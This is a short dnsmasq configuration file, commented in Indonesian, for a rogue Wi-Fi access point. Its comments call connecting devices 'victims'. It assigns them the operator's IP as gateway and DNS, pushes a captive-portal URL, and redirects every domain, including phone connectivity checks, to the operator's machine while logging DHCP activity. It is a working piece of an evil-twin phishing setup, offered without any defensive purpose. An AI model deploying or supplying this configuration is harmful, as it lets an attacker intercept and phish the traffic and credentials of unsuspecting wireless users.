# Interface yang digunakan (Pastikan sesuai dengan monitor mode iface)
interface=wlan0

# Paksa dnsmasq untuk mendengarkan di IP kita saja
listen-address=192.168.1.1

# Range IP untuk korban (Lease time singkat agar cepat refresh)
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,1h

# Gateway & DNS (Arahkan ke IP kita)
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# RFC7710: Standard terbaru untuk Captive Portal (Sangat ampuh buat Android/iOS)
dhcp-option=114,"http://192.168.1.1/"

# Trik Apple & Android: Beritahu perangkat bahwa kita adalah portal lokal
dhcp-option=252,"\n"

# SAKTI: Belokkan SEMUA domain (termasuk connectivity checks) ke IP kita
address=/#/192.168.1.1

# Log DHCP tetap aktif buat pantauan
log-dhcp

# Optimasi DNS: Jangan tanya server luar, jangan baca file lokal
no-resolv
no-hosts
bogus-priv
domain-needed
